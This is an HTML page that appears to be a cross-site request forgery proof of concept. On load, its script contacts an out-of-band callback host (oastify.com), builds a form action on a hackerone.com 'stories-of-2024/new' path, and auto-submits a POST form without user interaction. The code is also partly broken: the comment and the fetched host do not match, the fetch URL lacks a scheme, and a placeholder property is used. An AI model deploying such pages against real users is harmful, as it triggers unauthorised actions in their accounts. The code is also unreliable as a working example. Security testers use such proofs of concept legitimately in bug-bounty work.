<html>
  <body>
    <form id="myForm" method="POST">
      <input type="submit" value="Submit request" />
    </form>

    <script>
      // Fetch the data from the server at "https://mysite.com/confirmedstories"
      fetch("jf2uze9hlgphldd4zmoxs0j2vt1kpadz.oastify.com")
        .then(response => response.json())  // Assuming the response is JSON
        .then(data => {
          // Assuming the server response contains some kind of identifier or URL fragment
          const responseFragment = data.someProperty;  // Adjust based on actual response structure

          // Build the new action URL
          const newActionUrl = "https://hackerone.com/stories-of-2024/new" + responseFragment;

          // Set the form's action attribute dynamically
          const form = document.getElementById("myForm");
          form.action = newActionUrl;

          // Submit the form
          form.submit();
        })
        .catch(error => {
          console.error("Error fetching the data:", error);
        });
    </script>
  </body>
</html>
